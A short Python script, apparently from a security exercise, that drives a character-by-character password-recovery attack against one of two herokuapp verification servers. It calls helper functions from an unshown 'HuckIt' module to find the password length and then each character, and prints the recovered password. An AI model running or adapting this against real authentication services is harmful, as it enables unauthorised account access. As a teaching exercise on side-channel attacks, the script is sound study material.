import time
import requests
from HuckIt import find_pass_len, find_tav

if __name__ == '__main__':
    MAX_LEN = 32

    GAL_SITE = True

    if GAL_SITE:
        url = r'https://verifyserver.herokuapp.com/index'
        POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        # POOL_SHORT = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

    else:
        url = "https://passwordserver.herokuapp.com/"

        POOL = '0123456789'

    pswd_len = find_pass_len( url, MAX_LEN)
    temp_pswd = ""
    for i in range(pswd_len):
        temp_pswd += find_tav(pswd_len, temp_pswd)
    print("the password is : " + temp_pswd)